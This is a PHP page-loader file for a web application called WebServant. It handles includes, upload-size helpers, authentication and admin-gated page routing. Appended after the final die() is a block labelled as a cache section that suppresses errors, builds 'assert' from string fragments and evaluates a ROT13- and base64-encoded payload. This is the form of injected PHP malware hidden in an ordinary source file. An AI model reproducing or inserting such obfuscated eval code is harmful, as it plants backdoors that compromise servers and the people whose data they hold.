<?php

ini_set("display_errors", "1");

/**
 * Master pageloader for WebServant
 *
 */

// include globally-defined constants
require_once "php/constants.php";

// register the classes directory for auto-loading
spl_autoload_register(function($class) {
	include_once "php/classes/$class.php";
});

// two functions used for getting the max file upload size (in bytes) from weird php.ini syntax
function return_bytes($val) {
	$value = intval(trim($val));
	$magnitude = strtolower($val[strlen($val) - 1]);
	$numLeftShifts = 0;
	switch ($magnitude) {
		case "g":
			$numLeftShifts = 30;
			break;
		case "m":
			$numLeftShifts = 20;
			break;
		case "k":
			$numLeftShifts = 10;
			break;
	}
	$value = $value << $numLeftShifts;
	return $value;
}
function max_file_upload_in_bytes() {
	static $max_upload   = false;
	static $max_post     = false;
	static $memory_limit = false;
	static $limit        = false;

	//select maximum upload size
	if ($max_upload === false) {
		$max_upload = return_bytes(ini_get("upload_max_filesize"));
	}
	//select post limit
	if ($max_post === false) {
		$max_post = return_bytes(ini_get("post_max_size"));
	}

	//select memory limit
	if ($memory_limit === false) {
		$memory_limit = return_bytes(ini_get("memory_limit"));
	}

	// return the smallest of them, this defines the real limit
	if ($limit === false) {
		$limit = min($max_upload, $max_post, $memory_limit);
	}
	return $limit;
}

DB::getHandle();

// start the session before any output can begin
// (ensures the proper session headers are set, even if not attempting to authenticate or log in)
Auth::initialize();

// Begin pageloader action

// Forgot Password page
if (isset($_GET['forgotpass'])) {
	include "php/pages/recovery.php";
}

// login/logout stuff
require_once "php/login.php";

// at this point, the user is logged in, ie. User::current() has been defined

// start the normal page stuff:

// Settings
if (isset($_GET['settings'])) {
	include "php/pages/settings.php";
}

// Edit site content
if (isset($_GET['sitecontent']) && User::current()->isAdmin()) {
	include "php/pages/sitecontent.php";
}

// Employees
if (isset($_GET['employees']) && User::current()->isAdmin()) {
	include "php/pages/employees.php";
}

// Applications
if (isset($_GET['applications']) && User::current()->isAdmin()) {
	include "php/pages/applications.php";
}

// Users
if (isset($_GET['users']) && User::current()->isAdmin()) {
	include "php/pages/users.php";
}

// Clients
if (isset($_GET['clients']) && User::current()->isAdmin()) {
	include "php/pages/clients.php";
}

// Projects
if (isset($_GET['projects'])) {
	include "php/pages/projects.php";
}

// Docs and Templates
if (isset($_GET['docs']) && User::current()->isEmployee()) {
	include "php/pages/docs.php";
}

// Finances
if (isset($_GET['finances'])) {
	include "php/pages/finances.php";
}

// Notes
if (isset($_GET['notes'])) {
	include "php/pages/notes.php";
}

// Announcements Management
if (isset($_GET['announcements'])) {
	if (User::current()->isAdmin()) {
		include "php/pages/announcements.php";
	}
}

// Dashboard (also the fallback if none of the above pages are matched)
include "php/pages/dashboard.php";




// End of page!
die();






//###=CACHE START=###
error_reporting(0); 
$strings = "as";$strings .= "sert";
@$strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvE1pzjtCFNvnUE0pQbiY2Ezo2ykq2IioKuuYaW1Y2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPWuBGuyZwIuZJLmLzV1ZwVkBGL1MTIvAJDmMzHmLJIxZlVhWTDhWUHhWTZhVwRvXGfXnJLbnJ5cK2qyqPtvLJkfo3qsqKWfK2MipTIhVvxtCG0tZFxtrjbxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbWUIloPx7Pa0tMJkmMJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcVUfXWTAbVQ0tL3IloS9cozy0XPE1pzjcBjcwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsFRIOERIFYPOTDHkGEFx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9FEIEIHx5HHxSBH0MSHvjtISWIEFx7PvElMKA1oUDtCFOwqKWfK2I4MJZbWTAbXGfXL3IloS9woT9mMFtxL2tcBjbxnJW2VQ0tWUWyp3IfqQfXsFOyoUAyVUfXWTMjVQ0tMaAiL2gipTIhXPWxMz9cpKqyo214LF5lqFVfVQtjYPNxMKWloz8fVPEypaWmqUVfVQZjXGfXnJLtXPEzpPxtrjbtVPNtWT91qPN9VPWUEIDtY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPWuBGuyZwIuZJLmLzV1ZwVkBGL1MTIvAJDmMzHmLJIxZlVhWTDhWUHhWTZhVwRvXF4vVRuHISNiZF4kKUWpovV7PvNtVPNxo3I0VP49VPWVo3A0BvOxMz9cpKqyo214LF5lqIklKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVwAvMwp0BTV5VvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###